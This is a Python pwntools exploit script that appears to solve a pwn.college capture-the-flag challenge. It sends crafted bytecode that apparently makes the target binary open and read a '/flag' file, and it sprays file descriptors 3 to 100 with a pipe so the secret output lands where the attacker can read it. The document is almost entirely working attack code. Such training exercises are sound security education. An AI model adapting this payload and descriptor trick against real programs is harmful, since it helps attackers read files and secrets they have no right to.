import os
import sys
from pwn import *

context.log_level = 'info'

def main():
    # --- Configuration ---
    exe = './toddlerone-level-10-1'
    
    bytecode = b"\x2f\x08\x04\x00\x08\x40\x04\x40\x40\x66\x08\x04\x01\x08\x40\x04\x40\x40\x6c\x08\x04\x02\x08\x40\x04\x40\x40\x61\x08\x04\x03\x08\x40\x04\x40\x40\x67\x08\x04\x04\x08\x40\x04\x40\x40\x00\x08\x04\x05\x08\x40\x04\x40\x40\x00\x08\x10\x00\x08\x40\xff\x08\x02\x10\x20\x15"

     # --- Step 1: Create Pipe ---
    # r_pipe will likely be 3, w_pipe likely 4
    r_pipe, w_pipe = os.pipe()

    # --- Step 1.5: PROTECT THE READ PIPE ---
    # We are about to overwrite FDs 3-100 with write-handles.
    # If r_pipe is 3, we would overwrite our read-handle with a write-handle!
    # So, we duplicate r_pipe to a safe high number (e.g., 500) and use that instead.
    safe_r_pipe = 500
    os.dup2(r_pipe, safe_r_pipe) # Make 500 a copy of 3
    os.close(r_pipe)             # Close 3 so it can be overwritten safely
    r_pipe = safe_r_pipe         # Update our variable to use 500

    # --- Step 2: FD Spray ---
    # Now it is safe to overwrite FDs 3-100
    log.info("Spraying File Descriptors 3-100 with our pipe...")
    for fd in range(3, 101):
        try:
            # We dup2 w_pipe (write-end) to these FDs.
            # If w_pipe is 4, dup2(4, 4) is harmless.
            os.dup2(w_pipe, fd)
        except OSError:
            pass

    # --- Step 3: Start Process ---
    log.info(f"Starting {exe} with inherited FDs...")
    try:
        p = process(exe, close_fds=False)
    except Exception as e:
        log.error(f"Could not start binary: {e}")
        sys.exit(1)

    # Close write-end in parent so read() doesn't block forever
    os.close(w_pipe)

    # --- Step 4: Send Payload ---
    log.info(f"Sending {len(bytecode)} bytes...")
    p.send(bytecode)

    # --- Step 5: Read Trap ---
    log.info("Listening on pipe for flag data...")
    try:
        # Read from our SAFE high FD
        flag_data = os.read(r_pipe, 1024)
        
        print(f"\n[+] Raw Output: {flag_data}")
        print(f"[+] Decoded:    {flag_data.decode(errors='ignore')}")
        
        if b"pwn.college" in flag_data:
            log.success("FLAG CAPTURED!")
        else:
            log.warning("Data captured, but flag format not detected.")
            
    except Exception as e:
        log.error(f"Error reading pipe: {e}")
    finally:
        p.close()
        os.close(r_pipe)

if __name__ == '__main__':
    main()
